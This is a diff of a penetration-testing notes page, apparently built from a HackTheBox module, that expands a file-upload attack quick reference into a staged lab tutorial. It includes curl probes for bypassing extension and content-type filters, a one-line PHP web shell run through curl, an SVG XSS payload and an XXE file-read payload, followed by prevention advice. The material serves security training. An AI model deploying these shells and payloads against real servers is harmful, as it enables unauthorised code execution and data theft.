@@ -1,11 +1,197 @@
 ---
-title: "File Upload Testing: Quick Reference"
+title: "File Upload Attacks"
 sidebarTitle: "File uploads"
-description: "Review executable upload prerequisites and the saved extension, content-type, magic-byte, and processing examples."
+description: "Trace validation, storage, retrieval, and processing with controlled filename, header, byte, and execution tests."
 keywords: ["file upload", "webshell", "extension filter", "content type", "magic bytes", "php", "svg"]
 ---
 
 {/* Generated from Web/File Upload.md. Edit the Markdown source, then run scripts/sync_site.py. */}
+
+Follow the file through **request → validation → storage → retrieval → processing**. An “upload successful” message does not prove the file is reachable or executable. Establish each step, then choose a payload that fits the server language and processing behavior.
+
+## Enumerate the upload feature first
+
+Upload a known valid allowed image, such as `sample.png`, through the browser. Save the multipart request and response in Burp. Record:
+
+- Endpoint, HTTP method, file field name, cookies, CSRF token, and additional form fields.
+- Supplied filename, extension, declared Content-Type, and the actual file bytes.
+- Returned filename/ID, any renaming, storage path, retrieval URL, and whether access needs authentication.
+- Whether retrieval downloads the file, embeds it, transforms it, or processes it server-side.
+
+```bash
+BASE='http://app.htb'
+curl -sS -D upload.headers -o upload-response.html \
+  -F 'uploadFile=@sample.png;type=image/png' "$BASE/upload.php"
+```
+
+Adapt this request to the actual field name and required form/session values. A simplified curl request that omits a required token is not a valid comparison with the browser upload.
+
+## Find the validation layer
+
+| Observation | What to inspect next |
+| --- | --- |
+| Browser rejects the file without a request | `accept` attribute, JavaScript checks, then the server's behavior in Repeater |
+| Server rejects based on filename | Extension extraction, case handling, last-dot behavior, allowlist/blacklist |
+| Changing Content-Type changes the outcome | Whether the server trusts the client-controlled part header |
+| Server examines file bytes | Signature check versus actual image decoding |
+| Upload works but returned filename changes | Use the stored name/ID instead of guessing from the submitted name |
+| Image loses metadata or changes format | A processing step may remove embedded data |
+
+Keep one variable fixed while changing another. Otherwise you cannot tell which check rejected the file.
+
+## Test filename and header handling separately
+
+The next tests all use the **same PNG bytes**. They investigate validation; they are not executable payloads.
+
+```bash
+curl -sS -F 'uploadFile=@sample.png;filename=probe.php;type=image/png' "$BASE/upload.php"
+curl -sS -F 'uploadFile=@sample.png;filename=probe.pHp;type=image/png' "$BASE/upload.php"
+curl -sS -F 'uploadFile=@sample.png;filename=probe.php.jpg;type=image/png' "$BASE/upload.php"
+curl -sS -F 'uploadFile=@sample.png;filename=probe.jpg.php;type=image/png' "$BASE/upload.php"
+```
+
+Next retain the filename/bytes and change the declared type:
+
+```bash
+curl -sS -F 'uploadFile=@sample.png;filename=probe.png;type=application/octet-stream' "$BASE/upload.php"
+curl -sS -F 'uploadFile=@sample.png;filename=probe.png;type=image/jpeg' "$BASE/upload.php"
+```
+
+A browser sets these part headers, so they are not trustworthy evidence of content type. If a request succeeds, record the response and confirm the saved object actually exists.
+
+## Extension candidates and the condition behind each
+
+```text
+probe.php
+probe.phtml
+probe.php5
+probe.pHp
+probe.jpg.php
+probe.php.jpg
+```
+
+- Alternate extensions matter only if the server has a matching executable handler.
+- A double extension can expose a weak suffix test or handler pattern, but its order matters.
+- Mixed case depends on the validation and server behavior; case variation alone proves nothing.
+- Null bytes, trailing dots/spaces, semicolons, and Windows-specific filename behavior are platform/version-dependent. Investigate the observed parser before using a long bypass list.
+
+In Burp Intruder, vary only the filename extension in a captured valid request. Start with a small list, compare status/body/length and stored filename, and replay promising results manually. A 200 response containing “file rejected” is a failure, not a hit.
+
+## Test actual bytes and image processing
+
+```bash
+printf '%s\n' 'upload-marker-01' > probe.jpg
+file probe.jpg
+
+printf '%s' 'GIF89a' > signature-only.gif
+file signature-only.gif
+```
+
+An extension does not make a text file an image. Conversely, a short GIF signature may fool a shallow signature check without passing a real image decoder. A `file` result on your workstation does not prove that the server's validation accepts the same content.
+
+For a lab where a real image is accepted, inspect metadata and any transformation:
+
+```bash
+exiftool sample.png
+sha256sum sample.png
+curl -sS "$BASE/uploads/ACTUAL_STORED_NAME.png" -o retrieved.png
+file retrieved.png
+exiftool retrieved.png
+sha256sum retrieved.png
+```
+
+Different hashes can result from harmless recompression or metadata removal. Compare format and contents before assuming your embedded bytes survived.
+
+## Confirm storage and retrieval
+
+Look at the upload response, HTML image/link elements, API response, and subsequent browser requests. A filesystem path and a public URL are not interchangeable.
+
+```bash
+curl -sS -D retrieved.headers -o retrieved.body \
+  "$BASE/profile_images/ACTUAL_STORED_NAME"
+```
+
+Inspect response status, Content-Type, Content-Disposition, and the actual body. Check with the correct session if retrieval is authenticated. If the application returns a file ID, use its download route rather than guessing an `/uploads/` directory.
+
+## Establish server-side execution in stages
+
+For a PHP-handled path, start with a fixed proof instead of immediately debugging a shell connection:
+
+```bash
+printf '%s' '<?php echo "upload-exec-proof"; ?>' > proof.php
+curl -sS -F 'uploadFile=@proof.php;type=application/x-httpd-php' "$BASE/upload.php"
+curl -sS "$BASE/uploads/ACTUAL_STORED_NAME.php"
+```
+
+Seeing the **evaluated marker** supports PHP execution. Receiving the literal PHP source or a download is a different result. Once PHP execution is confirmed in the lab, a minimal command endpoint makes identity and directory checks explicit:
+
+```php
+<?php system($_GET['cmd']); ?>
+```
+
+Save that PHP as `cmd.php`, upload it using the working upload request, and use its actual returned storage URL in the following commands. The earlier fixed-marker file does not accept a `cmd` parameter.
+
+```bash
+curl -sS -G --data-urlencode 'cmd=id' "$BASE/uploads/ACTUAL_STORED_NAME.php"
+curl -sS -G --data-urlencode 'cmd=pwd' "$BASE/uploads/ACTUAL_STORED_NAME.php"
+curl -sS -G --data-urlencode 'cmd=ls -la' "$BASE/uploads/ACTUAL_STORED_NAME.php"
+```
+
+Use Windows commands if that is the observed host OS. For an interactive connection, verify the listener address/port and outbound reachability before selecting a [shell method](/exploitation/shells-payloads-cheat-sheet). An upload working does not ensure a reverse shell can reach your workstation.
+
+## When only non-executable types are accepted
+
+### Browser-side script through an uploaded SVG
+
+```xml
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(window.origin)">
+  <text x="10" y="20">upload proof</text>
+</svg>
+```
+
+This tests browser processing, not server-side PHP execution. The result depends on how the SVG is served or embedded, response headers, origin, and browser policy. An SVG used through an image element can behave differently from a directly navigated SVG document.
+
+### Metadata rendered into HTML
+
+```bash
+exiftool -Comment='metadata-marker-01' sample.png
+```
+
+Upload and find where that marker appears. Only if metadata is inserted unsafely into HTML does it become a route into [XSS testing](/web/xss). PHP in metadata does not execute merely because the file was uploaded or read by an image parser.
+
+### XML processing
+
+If the server parses an XML-based upload, an external-entity test is a separate hypothesis about that parser:
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE svg [<!ENTITY proof SYSTEM "file:///etc/hostname">]>
+<svg xmlns="http://www.w3.org/2000/svg"><text>&proof;</text></svg>
+```
+
+The parser must resolve the entity and expose its value for this proof to work. Treat a rejected SVG, a browser-rendered SVG, and server-side XML processing as distinct cases. Do not infer XXE just from accepting `.svg`.
+
+### Upload plus another file-processing flaw
+
+An uploaded image or archive may become significant if a separate inclusion route loads it through an interpreter. See [LFI upload chains](/web/lfi-rfi#upload-plus-inclusion). Filename injection or archive extraction issues likewise require evidence of the server-side operation consuming those values.
+
+## Troubleshooting and prevention
+
+| Symptom | Next check |
+| --- | --- |
+| Request rejected in curl but accepted in browser | Field name, cookie, token, form fields, and multipart boundary handling |
+| Accepted file cannot be found | Renaming, file ID, authenticated retrieval, and delayed processing |
+| PHP is downloaded as text | Handler configuration and served location, not the payload syntax |
+| Header trick works, modified image fails | Byte inspection or image decoding after the header check |
+| Uploaded content disappears | Re-encoding, metadata removal, quarantine, or asynchronous validation |
+
+A robust design validates expected types, generates storage names, stores uploads away from executable application paths, checks authorization on retrieval, and treats parser behavior as part of the attack surface.
+
+Source: synthesized from your [File Upload Attacks capture](/web/htb/file-upload-attacks), retaining the complete original lesson separately.
+
+## Earlier notebook reference
+
+The original shorthand is retained below. Use the context, prerequisites, and corrections above when applying these examples.
 
 Supplementary quick reference from the existing vault site. It does not mark the module as complete.
 
@@ -33,3 +219,11 @@ curl "http://$IP/uploads/shell.php?c=id"
 
 
 > For image uploads that get processed, an SVG with embedded script (stored XSS) or an EXIF-borne PHP payload can work when raw uploads are blocked.
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [File Upload Attacks — full HTB module](/web/htb/file-upload-attacks) — Original lesson capture with the longer transcripts.
+
+{/* VAULT_RELATED_END */}
